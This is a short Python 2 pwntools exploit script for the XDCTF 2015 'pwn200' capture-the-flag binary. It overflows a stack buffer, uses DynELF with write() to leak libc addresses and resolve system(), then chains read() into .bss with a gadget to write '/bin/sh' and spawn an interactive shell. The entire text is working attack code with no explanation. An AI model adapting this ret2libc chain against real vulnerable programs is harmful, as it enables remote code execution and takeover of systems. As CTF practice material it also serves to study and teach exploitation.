from pwn import*
p=process('./xdctf15-pwn200')
elf=ELF('./xdctf15-pwn200')

write_plt=elf.symbols['write']
write_got=elf.got['write']
read_plt=elf.symbols['read']
bss=elf.bss()
start=0x080483D0
main=0x080484BE
def leak(address):
        payload='a'*(0x6c+4)+p32(write_plt)+p32(start)+p32(1)+p32(address)+p32(4)
        p.recvuntil("Welcome to XDCTF2015~!\n")
	p.send(payload)
	leaked=p.recv(4)
	print "[%s] -> [%s] = [%s]" % (hex(address),hex(u32(leaked)),repr(leaked))
	return leaked

d=DynELF(leak,elf=ELF('./xdctf15-pwn200'))
system=d.lookup('system','libc')

#use 3pop 
payload2='a'*(0x6c+4)+p32(read_plt)+p32(0x080485cd)+p32(0)+p32(bss)+p32(8)+p32(system)+p32(0xdeadbeef)+p32(bss)
p.sendline(payload2)
p.send('/bin/sh\x00')
print "********already send \"/bin/sh\""


p.interactive()
